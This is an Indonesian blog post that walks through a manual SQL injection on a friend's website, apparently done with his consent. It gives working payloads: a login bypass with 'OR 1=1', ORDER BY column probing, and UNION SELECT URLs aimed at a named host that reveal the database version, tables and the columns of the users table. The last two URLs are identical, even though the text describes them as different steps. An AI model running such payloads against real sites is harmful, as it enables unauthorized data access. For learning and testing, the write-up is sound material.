---
layout: post
title: SQL Injection Manual
date: 2023-01-02
categories: ["Pentest","Website"]
---

Assalamualaikum wr,wb. Pada kesempatan kali ini saya akan mencoba melakukan SQL Injection pada website teman saya mas [Nikko Enggaliano](https://nikkoenggaliano.my.id) terima kasih telah memberikan saya kesempatan untuk mempraktekan SQLI pada websitenya,

Ketika saya mengakses website nya, saya disuguhkan login page seperti berikut : <br><br>
![01](/assets/sqli/1.png?raw=true) <br><br>

pertama kali yang saya lakukan adalah mengecek apakah form tersebut vuln terhadap sql injection, dengan cara saya mengisi form username dengan petik(') dan hasilnya website malah menunjukan error 500 <br><br>
![02](/assets/sqli/2.png?raw=true) <br><br>

selanjutnya saya coba isi form username dengan mengisi <strong>1-- #</strong>, dan saya mendapatkan error seperti ini <br><br>

![03](/assets/sqli/03.png?raw=true) <br><br> yang menurut saya, sepertinya ini termasuk vuln terhadap sql injection XD, selanjutnya saya berasumsi bahwa query dari sql untuk login tersebut adalah seperti ini : <br>

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```
selanjutnya saya mencoba menginputkan di form username **a' OR 1=1 --** yang dimana untuk mengontrol query, dimana query sql tersebut akan menjadi seperti ini : <br>



```sql
SELECT * FROM users WHERE username='a' OR 1=1 -- ' AND password='$password'
```

![3](/assets/sqli/3.png?raw=true)

dan akhirnya saya bisa masuk ke halaman index <br> <br>
![4](/assets/sqli/4.png?raw=true) <br><br>

setelah masuk ke halaman index saya melanjutkan explore ke halaman profile, setelah saya masuk ke halaman profile, saya melihat bentuk url nya seperti berikut <br><br>
![5](/assets/sqli/5.png?raw=true) <br><br>

Setelah itu saya melakukan pengecekan lagi, apakah vuln terhadap sql injection dengan memberikan petik di akhir url, dan saya mendapat error seperti ini <br><br>
![6](/assets/sqli/6.png?raw=true) <br><br>

Saya cek lagi dengan menambahkan --, dan hasilnya juga tetap error 500 <br><br>
![7](/assets/sqli/7.png?raw=true) <br><br>

Saya cek lagi dengan menambahkan -- #, dan hasilnya website berjalan dengan baik <br><br>
![8](/assets/sqli/8.png?raw=true) <br><br>

Setelah itu saya mencoba mengecek jumlah kolom dengan menggunakan order by <br><br>

Yang pertama saya melakukan order by 100 --, dan hasilnya error <br><br>
![9](/assets/sqli/9.png?raw=true) <br><br>

Selanjutnya saya melakukan order by 20 --, dan hasilnya juga error <br><br>
![10](/assets/sqli/10.png?raw=true) <br><br>

Selanjutnya saya melakukan order by 10 --, dan hasilnya juga error <br><br>
![11](/assets/sqli/11.png?raw=true) <br><br>

Selanjutnya saya melakukan order by 5 --, dan hasilnya website berjalan normal, disini saya mengetahui bahwa kolom nya berjumlah 5 <br><br>
![12](/assets/sqli/12.png?raw=true) <br><br>

Setelah itu saya melakukan perintah UNION SELECT untuk menampilkan kolomnya, dengan memodifikasi url nya seperti berikut
```
http://nikkoenggaliano.my.id:6611/profil.php?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL%20--%20#
```
![13](/assets/sqli/13.png?raw=true) <br><br>

Selanjutnya saya melakukan perintah UNION SELECT untuk menampilkan nama database dan versi dari database, dengan memodifikasi url nya seperti berikut
```
http://nikkoenggaliano.my.id:6611/profil.php?id=1%27%20UNION%20SELECT%20NULL,database(),version(),NULL,NULL%20--%20#
```
![14](/assets/sqli/14.png?raw=true) <br><br>

Selanjutnya saya melakukan dump daftar tabelnya, dengan memodifikasi url nya seperti berikut
```
http://nikkoenggaliano.my.id:6611/profil.php?id=1%27%20UNION%20SELECT%20NULL,database(),version(),table_name,NULL%20%20FROM%20information_schema.tables%20--%20#
```
![15](/assets/sqli/15.png?raw=true) <br><br>

Selanjutnya saya melakukan dump isi tabel users, dengan memodifikasi url nya seperti berikut
```
http://nikkoenggaliano.my.id:6611/profil.php?id=1%27%20UNION%20SELECT%20NULL,database(),version(),column_name,NULL%20%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27%20--%20#
```
![16](/assets/sqli/17.png?raw=true) <br><br>

Setelah saya dump isi tabelnya selanjtunya saya dump isi kolomnya, dengan memodifikasi url nya seperti berikut
```
http://nikkoenggaliano.my.id:6611/profil.php?id=1%27%20UNION%20SELECT%20NULL,database(),version(),column_name,NULL%20%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27%20--%20#
```
![18](/assets/sqli/18.png?raw=true) <br><br>

Sekian tulisan saya terkait praktek sql injection manual, jika ada kekurangan saya mohon maaf dan terima kasih, Assalamualaikum wr,wb.